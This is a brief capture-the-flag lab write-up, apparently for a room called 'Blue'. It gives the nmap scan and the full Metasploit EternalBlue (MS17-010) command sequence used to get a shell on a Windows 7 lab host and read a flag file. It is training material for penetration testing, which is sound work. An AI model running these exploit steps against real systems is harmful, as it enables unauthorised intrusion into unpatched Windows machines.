# Blue

## Initial recon

First, scan the host

```sh
nmap -A -T5 10.10.31.40
```

The main expoloitable service found was the `windows 7 professional 7601 Service pack 1`

Related to Eternalblue `MS17-010`

Now lets run the metasploit console

```sh
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
show targets
set TARGET 0
show options
set rhosts 10.10.31.40
exploit
```

Now we have a shell inside the windows machine. Let's look for the flag.

The final flag was found inside the documents folder for a person named `Jon`

```sh
C:\Users\Jon\Documents
type flag3.txt
```

## Followup Recon